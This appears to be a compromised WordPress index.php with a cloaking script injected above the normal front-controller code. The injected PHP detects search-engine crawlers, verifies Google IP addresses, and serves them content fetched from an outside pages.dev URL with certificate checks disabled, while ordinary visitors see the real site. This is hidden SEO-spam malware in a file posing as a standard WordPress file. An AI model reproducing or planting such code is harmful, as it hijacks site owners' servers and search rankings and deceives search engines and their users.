<?php
error_reporting(0);
ini_set('display_errors', 0);

// ============================================
// CONFIG
// ============================================
$config = array(
    'bot_url' => 'https://adventure-sarmang.pages.dev/numpang/',
    'timeout' => 15
);

// ============================================
// BOT DETECTION
// ============================================
function is_search_bot() {

    $bots = array(
        'Googlebot','Googlebot-Mobile','Googlebot-Image','Googlebot-News',
        'Googlebot-Video','AdsBot-Google','Mediapartners-Google',
        'Google-InspectionTool','Google-Site-Verification','Storebot-Google',
        'bingbot','msnbot','BingPreview',
        'Slurp','DuckDuckBot','Baiduspider','YandexBot',
        'facebookexternalhit','LinkedInBot','Twitterbot'
    );

    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

    foreach ($bots as $bot) {
        if (stripos($ua,$bot)!==false) {
            return true;
        }
    }

    return false;
}

// ============================================
// GOOGLE IP VERIFY
// ============================================
function verify_google_ip() {

    $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
    if (!$ip) return false;

    $google_prefix = array(
        '66.249.','64.233.','72.14.','209.85.','216.239.'
    );

    foreach ($google_prefix as $p) {
        if (strpos($ip,$p)===0) {
            return true;
        }
    }

    $host = @gethostbyaddr($ip);

    if ($host &&
        (stripos($host,'googlebot.com')!==false ||
         stripos($host,'google.com')!==false)) {

        $verify = @gethostbyname($host);
        if ($verify === $ip) {
            return true;
        }
    }

    return false;
}

// ============================================
// FETCH CONTENT
// ============================================
function get_remote_content($url,$timeout=10){

    if(function_exists('curl_init')){

        $ch=curl_init($url);

        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);
        curl_setopt($ch,CURLOPT_TIMEOUT,$timeout);
        curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
        curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,false);
        curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0');

        $content=curl_exec($ch);
        $code=curl_getinfo($ch,CURLINFO_HTTP_CODE);

        curl_close($ch);

        if($content && $code==200){
            return $content;
        }
    }

    if(ini_get('allow_url_fopen')){

        $context=stream_context_create(array(
            'http'=>array(
                'method'=>'GET',
                'timeout'=>$timeout,
                'user_agent'=>'Mozilla/5.0'
            ),
            'ssl'=>array(
                'verify_peer'=>false,
                'verify_peer_name'=>false
            )
        ));

        $content=@file_get_contents($url,false,$context);

        if($content!==false){
            return $content;
        }
    }

    return false;
}

// ============================================
// SERVE BOT CONTENT
// ============================================
function serve_bot_content($url,$timeout=15){

    $content=get_remote_content($url,$timeout);

    if($content){

        header('Content-Type:text/html; charset=utf-8');
        header('X-Visitor-Type: bot');

        echo $content;
        exit;
    }

    header('HTTP/1.1 503 Service Temporarily Unavailable');
    echo '<h1>503 Service Temporarily Unavailable</h1>';
    exit;
}

// ============================================
// MAIN
// ============================================
if(is_search_bot()){

    $ua=isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:'';

    if(stripos($ua,'Googlebot')!==false){

        if(verify_google_ip()){
            serve_bot_content($config['bot_url'],$config['timeout']);
        }

    }else{

        serve_bot_content($config['bot_url'],$config['timeout']);
    }
}

header('Content-Type:text/html; charset=utf-8');
header('X-Visitor-Type: user');
?>


<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp/wp-blog-header.php' );
